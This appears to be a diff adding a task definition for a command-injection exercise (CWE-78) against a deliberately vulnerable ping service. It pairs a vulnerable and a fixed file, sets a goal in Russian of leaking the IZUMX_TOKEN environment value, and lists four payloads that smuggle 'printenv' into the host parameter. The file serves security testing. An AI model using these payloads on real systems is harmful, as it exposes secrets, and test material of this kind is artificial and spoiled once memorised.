@@ -1,0 +1,16 @@
+{
+  "slug": "cmd_inject_plain",
+  "port": 8813,
+  "filter": "",
+  "entry": "before.py",
+  "fixed": "after.py",
+  "class": "CWE-78 command injection, no sanitising at all (control task)",
+  "goal": "заставить сервис вернуть ЗНАЧЕНИЕ переменной IZUMX_TOKEN (16 hex), а не её имя",
+  "probe": "/ping?host={payload}",
+  "escalate": [
+    "x;printenv IZUMX_TOKEN",
+    "x$(printenv IZUMX_TOKEN)",
+    "x|printenv IZUMX_TOKEN",
+    "x&&printenv IZUMX_TOKEN"
+  ]
+}
